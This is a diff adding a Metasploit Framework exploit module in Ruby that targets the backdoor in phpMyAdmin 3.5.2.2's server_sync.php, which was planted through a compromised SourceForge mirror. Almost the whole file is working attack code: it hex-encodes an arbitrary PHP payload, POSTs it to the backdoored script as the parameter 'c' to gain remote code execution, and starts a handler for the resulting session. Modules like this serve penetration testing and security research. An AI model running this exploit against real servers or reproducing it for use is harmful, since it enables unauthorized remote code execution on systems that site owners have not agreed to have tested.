@@ -1,0 +1,82 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'phpMyAdmin 3.5.2.2 server_sync.php Backdoor',
+			'Description'    => %q{
+					This module exploits an arbitrary code execution backdoor
+				placed into phpMyAdmin v3.5.2.2 thorugh a compromised SourceForge mirror.
+			},
+			'Author'         => [ 'hdm' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     => [ ['URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php'] ],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'ConnectionType' => 'find',
+						},
+					# Arbitrary big number. The payload gets sent as an HTTP
+					# response body, so really it's unlimited
+					'Space'       => 262144, # 256k
+				},
+			'DefaultOptions' =>
+				{
+					'WfsDelay' => 30
+				},
+			'DisclosureDate' => 'Sep 25 2012',
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [[ 'Automatic', { }]],
+			'DefaultTarget' => 0))
+
+		register_options([
+			OptString.new('PATH', [ true , "The base directory containing phpMyAdmin try", '/phpMyAdmin'])
+		], self.class)
+	end
+
+	def exploit
+
+		uris = []
+
+		tpath = datastore['PATH']
+		if tpath[-1,1] == '/'
+			tpath = tpath.chop
+		end
+
+		pdata = "c=" + Rex::Text.to_hex(payload.encoded, "%")
+
+		res = send_request_raw( {
+			'global'  => true,
+			'uri'     => tpath + "/server_sync.php",
+			'method'  => 'POST',
+			'data'    => pdata,
+			'headers' => {
+				'Content-Type'   => 'application/x-www-form-urlencoded',
+				'Content-Length' => pdata.length,
+			}
+		}, 1.0)
+
+		handler
+	end
+end
